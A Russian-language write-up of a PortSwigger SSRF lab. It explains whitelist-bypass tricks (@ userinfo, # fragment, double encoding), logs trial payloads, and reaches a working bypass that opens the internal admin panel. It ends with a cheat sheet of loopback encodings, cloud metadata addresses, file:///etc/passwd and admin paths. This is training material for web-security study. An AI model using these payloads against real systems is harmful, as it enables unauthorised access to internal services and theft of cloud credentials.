### SSRF с фильтрами ввода на основе белого списка
https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

Фильтр может искать совпадение в начале ввода или содержащееся в нем.

задание: нужно попасть на панель админ
 http://localhost/admin

и сказано что реализована защита от ssrf атак!

-----

ТЕОРИЯ

```http
СПОСОБЫ ОБХОДА ПРОВЕРОК ПО БЕЛЫМ СПИСКАМ

https://expected-host:fakepassword@evil-host  # через @

https://api.internal:@evil.com  # через :@

https://evil-host#expected-host  # через # - после # не уходит на сервер(но читает браузер)

https://expected-host.evil-host  # через (.)

https://allowed.target.com%2f@evil.com#@allowed.target.com/   комбо
```

---

### Символ `@` — Учетные данные в URL

- **Формат:** `https://<логин>:<пароль>@<хост>`
    
- **Как работает:**
    
    - Спецификация URL (`RFC 3986`) определяет `@` как разделитель между `userinfo` и `host`.
        
    - **Цель атаки:** Сделать так, чтобы фильтр "увидел" один хост, а HTTP-клиент — другой.

        >(**RFC 3986** — это официальный технический стандарт (документ IETF), который определяет **единообразный идентификатор ресурсов (URI)**, включая URL.)

         
> **Примеры:**
    
    1. **Белый список разрешает `api.internal`**
        
        - **Атакующий вводит:** `https://api.internal:@evil.com/`
            
        - **Фильтр видит:** Начинается с `https://api.internal` → **Разрешает**.
            
        - **HTTP-клиент видит:** Хост = `evil.com`, а `api.internal` — это логин (с пустым паролем после `:`). Запрос уйдет на `evil.com`.
            
    2. **Белый список содержит `internal.company.com`**
        
        - **Атакующий вводит:** `https://internal.company.com@attacker.com`
            
        - **Фильтр:** Видит `internal.company.com` в строке → **Разрешает**.
            
   >**HTTP-клиент:** Интерпретирует все до `@` как `userinfo`, хост = `attacker.com`. _(Важно: современные браузеры и клиенты часто запрещают `@` в userinfo, но менее строгие серверные клиенты могут позволять).



------

### `#` — Фрагмент URL

- **Формат:** `https://<хост>#<фрагмент>`
    
- **Как работает:**
    
    - `#` указывает на фрагмент страницы. **Фрагмент (`#...`) НЕ отправляется на сервер** как часть HTTP-запроса. Он обрабатывается только на клиенте (браузером).
        
    - **Цель атаки:** Фильтр проверяет весь URL, включая фрагмент, а HTTP-клиент отправляет запрос только до `#`.
        
- **Примеры:**
    
    1. **Белый список разрешает `trusted.domain`**
        
        - **Атакующий вводит:** `https://evil.com#trusted.domain`
            
        - **Фильтр:** Видит `trusted.domain` в строке → **Разрешает**.
            
        - **HTTP-клиент:** Игнорирует все после `#`. Запрос отправляется на `https://evil.com`.
            
    2. **Комбинация с `@`:** `https://trusted.domain@evil.com#.internal.com`
        
        - Фильтр может увидеть `internal.com`, но запрос уйдет на `evil.com`.



### Иерархия DNS (поддомены)

- **Формат:** `https://<обязательный-хост>.<злонамеренный-домен>`
    
- **Как работает:**
    
    - Фильтр проверяет _присутствие_ строки из белого списка в имени хоста.
        
    - DNS разрешает полное доменное имя (FQDN) справа налево.
        
- **Пример:**
    
    - **Белый список содержит `localhost`**
        
    - **Атакующий вводит:** `https://localhost.attacker.com`
        
    - **Фильтр:** Видит подстроку `localhost` → **Разрешает**.
        
    - **DNS-резолвер:** Ищет запись для `localhost.attacker.com`, которая контролируется атакующим и может указывать на любой IP (например, на внутренний сервер злоумышленника). **Но!** Запрос HTTP будет отправлен с заголовком `Host: localhost.attacker.com`. Это полезно, если нужно обмануть только фильтр, а не заставить сервер обратиться к _чистому_ localhost.
        

###  Кодирование символов

- **Идея:** Использовать URL-кодирование (`%xx`), двойное кодирование (`%25xx`) или другие кодовые представления символов, чтобы обмануть парсер.
    
- **Как работает:**
    
    - Фильтр может декодировать строку один раз, а HTTP-клиент — дважды (или наоборот). Или фильтр проверяет сырую строку, а клиент ее декодирует.
        
- **Примеры:**
    
    1. **Кодирование `@` как `%40`:**
        
        - Ввод: `https://trusted.domain%40evil.com`
            
        - Фильтр видит `trusted.domain` → **Разрешает**.
            
        - Клиент декодирует `%40` обратно в `@` и видит `https://trusted.domain@evil.com`.
            
    2. **Двойное кодирование точки в `localhost`:** `localhost%2eattacker.com` (где `%2e` = `.`)
        
        - Фильтр не находит `localhost.attacker.com` в списке → может пропустить.
            
        - После двойного декодирования сервером строка может стать валидным доменом.
            
    3. **Использование Unicode или другого алфавита:**
        
        - Использовать кириллическую `а` (U+0430) вместо латинской `a` (U+0061). Визуально похоже, для фильтра это разные символы. DNS может преобразовать его в punycode (`xn--`), и запрос уйдет на другой домен.
    - 
    - 
----
    
    **Фильтр в приложении** проверяет исходную строку: `https://good.com@evil.com#.good.com`
    
- **HTTP-клиент приложения** парсит ее:
    
    - Хост = `evil.com`
        
    - `good.com` — это `userinfo`
        
    - `#.good.com` — отбрасывается
        
- **Целевой сервер `evil.com`** получает запрос с `Host: evil.com`.
            

-------

### Комбинированные атаки (наиболее мощные)

Цель — создать максимальное несоответствие между тем, что видит фильтр и что видит HTTP-клиент.

**Пример:**

- **Белый список:** `https://allowed.target.com`
    
- **Пейлоад атакующего:** `https://allowed.target.com%2f@evil.com#@allowed.target.com/`
    
    - `%2f` — это кодированный символ `/`.
        
    - **Что происходит:**
        
        1. **Фильтр** может декодировать URL один раз и увидеть: `https://allowed.target.com/@evil.com#@allowed.target.com/`. Он видит `allowed.target.com` в начале и после `#` → разрешает.
            
        2. **HTTP-клиент** (например, cURL, `requests` в Python) получает эту строку, **полностью декодирует** `%2f` в `/`.
            
        3. **Интерпретация клиента:** Протокол `https://`, `userinfo` = `allowed.target.com`, хост = `evil.com`, фрагмент = `@allowed.target.com/`. **Запрос отправляется на `evil.com`** с заголовком `Host: evil.com`.

---------


начало лабы: перехват ответа POST запроса на получение числа товаров
видно url передается в параметрах = это уже признак потенциальной ssrf

<img src="../../assets/wrggggg5-1.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



буду пробовать способы
```http
СПОСОБЫ ОБХОДА ПРОВЕРОК ПО БЕЛЫМ СПИСКАМ

https://expected-host:fakepassword@evil-host  # через @

https://api.internal:@evil.com  # через :@

https://evil-host#expected-host  # через # - после # не уходит на сервер(но читает браузер)

https://expected-host.evil-host  # через (.)

https://allowed.target.com%2f@evil.com#@allowed.target.com/   комбо
```
 +_всевозможные способы кодирования и обфускации запросов!

---
цель: http://localhost/admin

оригнал параметр url: stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1

-----

сперва попробую понять , что блокируется, что нет:


первая подсказка: он ожидает: stock.weliketoshop.net из белого списка!

<img src="../../assets/wrfg46666644.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



500 есть доступ к серверу!

<img src="../../assets/wwwwe4422.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



вот типичные ответы на мои попытки
жалобы на неверный url

<img src="../../assets/g354w5gthrjwrgncb.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />





```http
stockApi=http%3A%2F%2Flocalhost%2Fadmin.stock.weliketoshop.net#stock.weliketoshop.net

```

новая ошибка, блокирует запрет слова!

<img src="../../assets/wwwbbkkll0866§-1.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />




требует чтобы начало было из белого списска
http%3A%2F%2Flocalhost%2Fadmin%23stock.weliketoshop.net

400 "External stock check host must be stock.weliketoshop.net"

<img src="../../assets/nht,etnxnj,syfxfkj.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />





http%3A%2F%2Fstock.weliketoshop.net%40localhost%2Fadmin%23stock.weliketoshop.net 
респонс 400 "External stock check host must be stock.weliketoshop.net"

http%3A%2F%2Fstock.weliketoshop.net.localhost%2Fadmin%23stock.weliketoshop.net
респонс 400 "External stock check host must be stock.weliketoshop.net"

stockApi=http%3A%2F%2Fstock.weliketoshop.net#localhost%2Fadmin
500 Internal Server Error - 


кодировки http%3A%2F%2Fstock.weliketoshop.net:@%6c%25%36%66calh%25%36%66s%74%2Fadmin#stock.weliketoshop.net
ответ 400 "External stock check host must be stock.weliketoshop.net"



http%3A%2F%2Fstock.weliketoshop.net#@%6c%25%36%66calh%25%36%66s%74%2Fadmin#stock.weliketoshop.net
400 "Invalid external stock check url 'Illegal character in fragment at index 50: http://stock.weliketoshop.net#@l%6fcalh%6fst/admin#stock.weliketoshop.net'"

http%3A%2F%2Fstock.weliketoshop.net@%6c%25%36%66%25%36%33%25%36%31%25%36%63h%25%36%66s%74%2Fadmin#stock.weliketoshop.net
400 "External stock check host must be stock.weliketoshop.net"



http%3A%2F%2Fstock.weliketoshop.net@%6c%25%36%66calh%25%36%66s%74%2Fadmin#stock.weliketoshop.net
400 "External stock check host must be stock.weliketoshop.net"


http%3A%2F%2Fstock.weliketoshop.net@%6c%25%36%66calh%25%36%66s%74%2Fadmin%25%32%33stock.weliketoshop.net
400 "External stock check host must be stock.weliketoshop.net"


stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%34%30localhost%2Fadmin
400 "External stock check host must be stock.weliketoshop.net"

---

stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%34%30%25%36%63%25%36%66ca%6c%25%36%38os%74%2F%61%64mi%25%36%65
400 "External stock check host must be stock.weliketoshop.net"


stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%34%30%25%36%63%25%36%66ca%6c%25%36%38os%74%2F%61%64mi%25%36%65
400 "External stock check host must be stock.weliketoshop.net"

странно что разные ответы на одинаковые с виду запросы 

---

разобрался!
просто пустая строка портила мне тут все! из-за невнимательности - нужно теперь переделать все запросы!

<img src="../../assets/rrrkkkll;;oo06-6.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



---

stockApi=http%3A%2F%2Fstock.weliketoshop.net#@%6c%25%36%66calh%25%36%66s%74%2Fadmin#stock.weliketoshop.net
400 "Invalid external stock check url 'Illegal character in fragment at index 50: http://stock.weliketoshop.net#@l%6fcalh%6fst/admin#stock.weliketoshop.net'" 
(жалуется на символы после решетки..)

stockApi=http%3A%2F%2Fstock.weliketoshop.net@%6c%25%36%66calh%25%36%66s%74%2Fadmin#stock.weliketoshop.net
400 "External stock check host must be stock.weliketoshop.net"
(без решетки уже видимо сервер не принимает)

----
пока что самый необычный ответ 
stockApi=http%3A%2F%2Fstock.weliketoshop.net#localhost%2Fadmin  вернул 500 ерор

пощупаю его варианты:

stockApi=http%3A%2F%2Flocalhost%2Fadmin#stock.weliketoshop.net
400 "External stock check host must be stock.weliketoshop.net"

http%3A%2F%2Fstock.weliketoshop.net#localhost%2Fadmin#stock.weliketoshop.net
400 
"Invalid external stock check url 'Illegal character in fragment at index 45: http://stock.weliketoshop.net#localhost/admin#stock.weliketoshop.net'"

http%3A%2F%2Fstock.weliketoshop.net@localhost%2Fadmin#stock.weliketoshop.net
400 "External stock check host must be stock.weliketoshop.net"


stockApi=http%3A%2F%2Fstock.weliketoshop.net#llht%2Fmin#stock.weliketoshop.net
400 "Invalid external stock check url 'Illegal character in fragment at index 38: http://stock.weliketoshop.net#llht/min#stock.weliketoshop.net'" (хотя тут на 38 позии просто буквы L)

stockApi=http://stock.weliketoshop.net?@localhost/admin
500 Internal Server Error - интересно!

stockApi=http://stock.weliketoshop.net? чтобы я тут не писал после ? всегода ответ 500, то есть не зависит от дальнейшего содержимого!

stockApi=http%3A%2F%2Fstock.weliketoshop.net?llht%2Fmin#stock.weliketoshop.net 
500


stockApi=http%3A%2F%2Fstock.weliketoshop.net?@llht%2Fmin#stock.weliketoshop.net
500

stockApi=http%3A%2F%2Flocalhost%2Fadmin?@stock.weliketoshop.net
400 External stock check host must be stock.weliketoshop.net"

stockApi=http%3A%2F%2Flocalhost%2Fadmin?stock.weliketoshop.net
400    External stock check host must be stock.weliketoshop.net"


stockApi=http%3A%2F%2Fstock.weliketoshop.net%3F%40localhost%2Fadmin 
500



stockApi=http%3A%2F%2Fstock.weliketoshop.net%2Flocalhost%2Fadmin
400 
"Invalid external stock check url 'Illegal character in path at index 45: http://stock.weliketoshop.net/localhost/admin


stockApi=http%3A%2F%2Fstock.weliketoshop.net%2F..%2Flocalhost%2Fadmin
500



http%3A%2F%2Fstock.weliketoshop.net%25%34%30localhost%2Fadmin%25%32%33stock.weliketoshop.net
External stock check host must be stock.weliketoshop.net"

http%3A%2F%2Fstock.weliketoshop.net%25%34%30lcalhst%2Famn%25%32%33stock.weliketoshop.net   400


http%3A%2F%2Fstock.weliketoshop.net%25%32%35%25%33%34%25%33%30localhost%2Fadmin%25%32%33stock.weliketoshop.net
400

stockApi=http%3A%2F%2Fstock.weliketoshop.net 
500

-----

stockApi=http%3A%2F%2Fstock.weliketoshop.net#
500


# stockApi=http%3A%2F%2Fstock.weliketoshop.net@
400 (СРАЗУ ЗАБЛОЧИЛ СОБАЧКУ)
stockApi=http%3A%2F%2Fstock.weliketoshop.net%40 тоже блок
stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%34%30  блок
stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%32%35%25%33%34%25%33%30 блок


stockApi=http%3A%2F%2Fstock.weliketoshop.net#@  ожидаемо 500 ответ так как все что после решетки отсекается на сервер уходит  stock.weliketoshop.net

stockApi=http%3A%2F%2Fstock.weliketoshop.net#@localhost%2Fadmin 
ожидаемо 500 ответ так как все что после решетки отсекается на сервер уходит  stock.weliketoshop.net
то есть запрос попадает на внутренний сервер!

нужно как-то сделать так чтобы после конструкции #@ был валидный запрос!



stockApi=http%3A%2F%2F%2523@localhost%2Fadmin  
400

"Invalid external stock check url 'Illegal character in path at index 48: http://%23stock.weliketoshop.net@localhost/admin '"

# ЗАЦЕПКА

stockApi=http%3A%2F%2Fstock.weliketoshop.net#@localhost%2Fadmin # 500
stockApi=http%3A%2F%2Fstock.weliketoshop.net%2523@localhost%2Fadmin 
 400 "External stock check host must be stock.weliketoshop.net"
ТО ЕСТЬ решетка в чистом виде = 500 ошибка
а закодированная решетка = 400 но не обычный 400 ответ а "External stock check host must be stock.weliketoshop.net"!

поменял местами stockApi=http%3A%2F%2Flocalhost%2Fadmin%2523@stock.weliketoshop.net
ответ тот же 400  "External stock check host must be stock.weliketoshop.net"!


stockApi=http%3A%2F%2Fstock.weliketoshop.net:doood@localhost%2Fadmin 
400 
"External stock check host must be stock.weliketoshop.net"

stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%33%61doood@localhost%2Fadmin
400 
"External stock check host must be stock.weliketoshop.net"

-----


stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%33%61
ответ 400
"External stock check host must be stock.weliketoshop.net"

stockApi=http%3A%2F%2Fstock.weliketoshop.net: 
ответ 400
"Invalid external stock check url 'Invalid URL'"

----

http%3A%2F%2Fstock.weliketoshop.net%2523@localhost%2Fadmin%2523@stock.weliketoshop.net 400


-----

ответ 500
http%3A%2F%2Fstock.weliketoshop.net%2523@stock.weliketoshop.net
до @ как логин после собаки - хост, если хост из белого списка - то пропускает!

если не из белого - то ответ 400
stockApi=http%3A%2F%2Fstock.weliketoshop.net%2523@localhost/admin

НО ЕЩЕ ЕСТЬ РЕШЕТКА В ДВОЙНОЙ КОДИРОВКЕ
	КОТОРОЙ НУЖНО БУДЕТ ОТСЕЧЬ ТОГДА ТО ЧТО ПОСЛЕ @


но ответ 400"External stock check host must be stock.weliketoshop.net"
снова не видит белый список
значит проверка идет и по началу строки и в конце
и до @ и после
stockApi=http%3A%2F%2Flocalhost/admin%2523@stock.weliketoshop.net 


ответ 400
снова не видит разрешенный хост
stockApi=http%3A%2F%2Fstock.weliketoshop.net@localhost/admin%2523@stock.weliketoshop.net

забавно но тут тоже он не нашел хоста из белого списска
stockApi=http%3A%2F%2Fstock.weliketoshop.net@stock.weliketoshop.net%2523@stock.weliketoshop.net
ответ 400 "External stock check host must be stock.weliketoshop.net"

http%3A%2F%2Fstock.weliketoshop.net%2523@stock.weliketoshop.net%2523@stock.weliketoshop.net так тоже не видит разрешенных url
понял почему= он думает что после первой @ все является хостом а там биллеберда

вот так ответ 500
http%3A%2F%2Fstock.weliketoshop.net%2523@stock.weliketoshop.net
так как  после @ уже нормальный хост!

в ориг запросе есть указание порта 8080

пробую
http%3A%2F%2Flocalhost%3A8080%2Fadmin%2523@stock.weliketoshop.net 400




-----

сработал такой запрос
http%3A%2F%2Flocalhost%3A80%2523@stock.weliketoshop.net%2Fadmin
http://localhost:80#@stock.weliketoshop.net/admin

<img src="../../assets/ffffffffvfvfvf.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



из косоли перехватил запрос на удаление юзера!

<img src="../../assets/rvgjdkkkddv44.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



подставил путь в свой пейлоад и удалил карлоса - лаба выполнена!

<img src="../../assets/skakaks4.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />





# как и почему это сработало?

1) ```http
   http://localhost:80%2523@stock.weliketoshop.net/admin
   
   такую строку видит браузерный фильр после первыичного декодирования URL
   %2523  - это моя # решетка, он не видит ее как решетку
   
   все что после  @ считает за разрешенный хост!
   все что до @ считается логином типо?
   
   ----
   
   после еще двух декодировок 
   
   видно сырой запрос который видмо попадает уже на сервер
   
   http://localhost:80#@stock.weliketoshop.net/admin
   
   и тут все что после решетки - отсекается полностью
   остается только  localhost:80
   
   и это localhost:80 дает доступ к админке? почему?
   
   потому что - все правильно! 
   http%3A%2F%2Flocalhost%3A80%2523@stock.weliketoshop.net
   этот запрос тоже работает! бинго!
   
   просто напросто админка находится по адресу localhost:80
   и все! не нужен этот путь /admin
   
   все было проще чем я думал, просто там был другой путь к админке!
   
   ```


правильный - ответ
```http
http%3A%2F%2Flocalhost%3A80%2523@stock.weliketoshop.net

http://localhost:80#@stock.weliketoshop.net
```

ПУТИ АДМИНОК перспективные
---------------
#### **IPv4:**

- `127.0.0.1` — стандартный loopback
    
- `127.0.0.2`, `127.0.0.3` ... `127.255.255.254` — все работают как localhost
    
- `127.1` = `127.0.0.1` (короткая запись)
    
- `127.0.1` = `127.0.0.1`
    
- `2130706433` = `127.0.0.1` в десятичном формате
    
- `0x7f000001` = `127.0.0.1` в hex
    
- `017700000001` = `127.0.0.1` в octal
    
- `0` = иногда резолвится в `0.0.0.0`
-----------
#### **IPv6:**

- `::1` — IPv6 loopback
    
- `[::1]` — в URL формате
    
- `0000::1`, `0:0:0:0:0:0:0:1`
    
- `::ffff:127.0.0.1` — IPv4-mapped IPv6
--------

#### **Доменные имена:**

- `localhost`
    
- `local` (иногда)
    
- `localhost.localdomain`
    
- `.localhost` (с ведущей точкой)
------

#### **Private IP ranges:**

- `10.0.0.0/8` — `10.0.0.1`, `10.10.10.10`, `10.1.1.1`
    
- `172.16.0.0/12` — `172.16.0.1`, `172.31.255.254`
    
- `192.168.0.0/16` — `192.168.0.1`, `192.168.1.1`, `192.168.100.1`
    
- `169.254.0.0/16` — link-local (автоконфигурация)
-----

### 🔧 **3. Cloud/Metadata сервисы**

#### **AWS:**

- `169.254.169.254` — AWS metadata service
    
- `169.254.170.2` — AWS ECS credentials
    

#### **Google Cloud:**

- `metadata.google.internal`
    
- `169.254.169.254`
    

#### **Azure:**

- `169.254.169.254`
    
- `168.63.129.16` — Azure metadata
    

#### **Docker:**

- `host.docker.internal` — хост из контейнера
    
- `gateway.docker.internal` — шлюз Docker
---


#### **Через файловую систему (file://):**

- `file:///etc/passwd`
    
- `file:///c:/windows/system32/drivers/etc/hosts`
    

#### **Через DNS rebinding:**

- `localhost.attacker.com` (DNS запись → 127.0.0.1)
    
- `127.0.0.1.nip.io` → резолвится в 127.0.0.1
    

#### **Через redirect/SSRF цепочку:**

- Запрос к одному внутреннему сервису, который делает запрос к другому
    

### 🔧 **5. Пути к админкам **

#### **Common admin paths:**
-   /admin
- 
- `/admin/`
    
-  /administrator/
    
- `/wp-admin/` (WordPress)
    
- `/manager/`
    
- `/console/`
    
- `/backend/`
    
- `/cp/` (control panel)
    
- `/dashboard/`
    
- `/system/`
    
- `/api/admin/`
    
- `/internal/`
    

#### **API endpoints:**

- `/admin/delete?username=carlos` (как в лабе)
    
- `/admin/users/delete/1`
    
- `/api/v1/admin`
    
- `/rest/admin`
    

## 🎯 **Для SSRF-тестирования  проверить также:**

### **Порты (кроме 80):**

- `:443` (HTTPS)
    
- `:8080`, `:8000`, `:8888` — альтернативные HTTP
    
- `:3000`, `:3001` — Node.js dev серверы
    
- `:5000` — Flask dev
    
- `:9000`, `:9001` — разные сервисы
    
- `:22` (SSH), `:21` (FTP), `:25` (SMTP) — для других протоколов
    

### **Комбинации:**


127.0.0.1:8080/admin
localhost:3000/api
192.168.1.1:443/manager
10.0.0.1:80/cpanel


	в идеале тупо перебрать все варианты через бут форс где будет комбинация из всех вариантов!
нужно написать такой скритп на питоне!


